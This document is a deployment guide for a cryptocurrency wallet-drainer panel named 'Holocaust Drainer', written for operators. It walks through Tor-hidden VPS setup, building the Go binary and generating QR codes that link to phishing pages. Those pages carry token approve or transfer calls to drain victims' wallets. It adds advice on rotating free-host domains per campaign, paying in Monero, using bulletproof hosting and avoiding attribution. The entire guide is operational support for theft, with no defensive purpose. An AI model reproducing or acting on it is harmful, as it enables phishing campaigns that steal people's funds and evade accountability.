# Holocaust Drainer — deploy.md
From a bare VPS to a fully online drainer panel. Read tor-security.md section 1–4 first (hardening + onion creation); this guide assumes the VPS is hardened and Tor is running with the hidden service pointing at 127.0.0.1:8899.

---

## 1. Packages to install

Minimal by design (smaller surface, faster to audit):

```bash
apt update
apt -y install tor ca-certificates curl wget gnupg unzip jq ufw fail2ban chrony
```

| Package | Why |
|---|---|
| tor | the hidden service plumbing |
| ca-certificates | TLS for `go mod download` at build time |
| curl, wget | fetching the source / any future updates |
| gnupg, unzip | verify + unpack the Go toolchain tarball |
| jq | small JSON pokes during ops (optional but handy) |
| ufw, fail2ban, chrony | hardening stack (see tor-security.md) |

No PHP, no database, no Node, no runtime interpreters. The panel is one
static Go binary; nothing else runs on the box.

---

## 2. Get the Go toolchain (build machine only — you can also cross-compile
##    on your workstation and upload the binary)

```bash
# versions move; check https://go.dev/dl/ and pin the current stable
GO_VER=go1.26.7
cd /tmp
wget https://go.dev/dl/${GO_VER}.linux-amd64.tar.gz
echo "verify the sha256 printed on go.dev/dl against:" && sha256sum ${GO_VER}.linux-amd64.tar.gz
tar -C /usr/local -xzf ${GO_VER}.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin        # add to /etc/profile.d/go.sh to persist
go version
```

---

## 3. Put the source on the VPS

Two options.

Option A (build on VPS):
```bash
# copy the drainer/ folder up (from your workstation, over Tor-SSH):
#   rsync -e 'ssh -p 2718' -av drainer/ op@VPS:~/drainer/
cd ~/drainer
go mod vendor          # deps are already vendored; verify go.sum matches
go build -trimpath -buildvcs=false -ldflags "-s -w" -o holocaust ./cmd/holocaust
```

Option B (cross-compile at home, recommended — the VPS never needs the toolchain):
```bash
# on your workstation:
cd drainer
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -buildvcs=false \
  -ldflags "-s -w" -o holocaust ./cmd/holocaust
# upload over Tor-SSH as in Option A
```

Install:
```bash
install -m 0755 holocaust /usr/local/bin/holocaust
mkdir -p /var/lib/holocaust && chown op:op /var/lib/holocaust
```

---

## 4. First run (bootstrap the panel)

```bash
HOLOCAUST_PASS='pick-a-long-passphrase-here' \
HOLOCAUST_CONFIG=/var/lib/holocaust/config.json \
holocaust -listen 127.0.0.1:8899
```
- First run writes `config.json` containing: scrypt password hash, the QR
  HMAC secret, empty receivers. It prints the onion-facing port it listens on.
- Stop it (Ctrl-C), then run it under systemd as tor-security.md §5.2 shows,
  and REMOVE the HOLOCAUST_PASS env from the unit afterwards (the hash is in
  the config now).

Then from your workstation (via Tor):
```
http://YOUR.onion/login        -> sign in
Dashboard                      -> save receiving addresses (per chain)
Generate QR                    -> full workflow
```

---

## 5. Static hosting (the hop-page domains) — what works and why

The QR encodes `https://<your-domain>/p/<token>`. The page uploaded there is
self-contained (no JS calls home, no vendor requests). Requirements for the
host: serves static files over HTTPS, nothing else.

Tested-fit free providers (each works as of writing):
- Netlify Drop (drag-and-drop a folder; free `<name>.netlify.app` subdomain)
- Vercel (free `<name>.vercel.app`)
- GitHub Pages (free `<user>.github.io`)
- Cloudflare Pages (free `<name>.pages.dev`)
- Neocities / static.rs-style micro hosts (fine for one-page sites)

OPSEC on domain choice:
1. One fresh domain per campaign. Rotate when a page is burned or a campaign ends.
2. Subdomains of free hosts look like a million other landing pages — good.
3. Buy a custom domain only from a registrar that takes XMR and lets you use
   Cloudflare's HTTPS proxy; but a free host subdomain is usually safer to
   attribute-noise than a custom domain tied to your registrar account.
4. Never reuse a domain across two different payloads. The generator gives
   you the exact upload path (`p/<token>/index.html`) — matching it exactly is
   what makes the QR work.

---

## 6. Going fully online — final checklist

- [ ] Panel answers on `http://YOUR.onion/login` via Tor (HTTP 200).
- [ ] `ss -tlnp` shows panel on 127.0.0.1 only.
- [ ] A receiver address saved for at least one chain (dashboard).
- [ ] A QR generated; hop page uploaded to the exact path on fresh static domain;
      `curl https://your-domain/p/<token>` returns 200 and the page contains
      `0x095ea7b3` (approve mode) or `0xa9059cbb` (pay mode).
- [ ] QR test-scanned before distribution — see `verify.md` (required before
      first live use; testnet + throwaway-wallet paths, no burner phone).
- [ ] `HOLOCAUST_LOG` (if set) points to a file under /var/lib/holocaust,
      0600, and is rotated/deleted on your schedule.

---

## 7. Cost calculation (deployment + monthly)

One-time:
| Item | Cost |
|---|---|
| Go toolchain | $0 (open source) |
| Holocaust panel + drain binary | $0 (your build) |
| Tor hidden service | $0 (v3 onions have no registration fee) |
| Static host (per domain) | $0 (free tiers are fine at this scale) |
| Domain (optional, per custom domain) | $2–15/yr if bought with XMR |

Recurring (the only real cost is the VPS):
| Tier | Spec | Typical XMR/mo |
|---|---|---|
| Minimum | 1 vCPU / 1 GB RAM / 10 GB disk | $3–6 |
| Comfortable | 2 vCPU / 2 GB / 20 GB | $6–12 |
| Bulletproof-tier hosting | varies | $15–40 |

The panel binary idles at <20 MB RAM and near-zero CPU (stateless QR + two
forms). A $4/mo box is genuinely sufficient for dozens of parallel campaigns.
Budget for a burner phone (one-time $30–60) for QR test-scans — do not scan
your own codes from a device tied to you.

Total realistic cost to run: **$3–6/month.** Total annual under $100 if you
skip custom domains.

---

## 8. Maintenance

- Monthly: `apt update && apt -y upgrade`, reboot (kernel), Tor reload.
- Monthly: check `/var/log/tor/notices.log` for hidden-service upload errors.
- Per campaign: fresh static domain, fresh QR token, fresh receiver address.
- The binary has no telemetry, no update phone-home — replace it manually when
  you rebuild; config.json stays compatible (fields are versioned by presence).
